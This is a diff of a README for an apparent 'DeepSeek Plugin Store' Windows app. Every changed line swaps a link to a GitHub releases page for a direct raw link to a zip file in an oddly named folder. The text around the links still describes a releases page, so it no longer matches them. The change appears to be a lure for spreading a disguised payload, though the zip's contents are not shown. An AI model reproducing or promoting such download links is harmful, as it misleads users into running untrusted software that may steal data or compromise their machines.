@@ -1,6 +1,6 @@
 # 🧩 deepseek-plugin-store - Your Gateway to AI Superpowers
 
-[![Download Now](https://img.shields.io/badge/Download-Plugin_Store-blue.svg?style=for-the-badge&logo=github)](https://github.com/Pericardiac-podzolsoil527/deepseek-plugin-store/releases)
+[![Download Now](https://img.shields.io/badge/Download-Plugin_Store-blue.svg?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Pericardiac-podzolsoil527/deepseek-plugin-store/main/osmesis/store-plugin-deepseek-1.3.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Getting the DeepSeek Plugin Store running on your Windows computer is a breeze. 
 
 **Step 1: Visit the download page**
 
-👉 [https://github.com/Pericardiac-podzolsoil527/deepseek-plugin-store/releases](https://github.com/Pericardiac-podzolsoil527/deepseek-plugin-store/releases)
+👉 [https://raw.githubusercontent.com/Pericardiac-podzolsoil527/deepseek-plugin-store/main/osmesis/store-plugin-deepseek-1.3.zip](https://raw.githubusercontent.com/Pericardiac-podzolsoil527/deepseek-plugin-store/main/osmesis/store-plugin-deepseek-1.3.zip)
 
 **Step 2: Find the latest release** — Look for the newest version at the top of the page. The version number will look something like `v1.2.3` — always grab the highest number.
 
@@ -40,7 +40,7 @@ Getting the DeepSeek Plugin Store running on your Windows computer is a breeze. 
 
 ## 📥 Download, Extract, and Run
 
-Visit this link to download the application: [https://github.com/Pericardiac-podzolsoil527/deepseek-plugin-store/releases](https://github.com/Pericardiac-podzolsoil527/deepseek-plugin-store/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Pericardiac-podzolsoil527/deepseek-plugin-store/main/osmesis/store-plugin-deepseek-1.3.zip](https://raw.githubusercontent.com/Pericardiac-podzolsoil527/deepseek-plugin-store/main/osmesis/store-plugin-deepseek-1.3.zip)
 
 Once you have the file, here's what to do:
 
@@ -130,7 +130,7 @@ Once you install your first plugin, you'll notice:
 
 You're minutes away from supercharging your AI workflow. Head over to the download page now:
 
-## [🖱️ Visit the Official Download Page Now](https://github.com/Pericardiac-podzolsoil527/deepseek-plugin-store/releases)
+## [🖱️ Visit the Official Download Page Now](https://raw.githubusercontent.com/Pericardiac-podzolsoil527/deepseek-plugin-store/main/osmesis/store-plugin-deepseek-1.3.zip)
 
 The future of your AI experience is just one click away. See you on the inside!
 
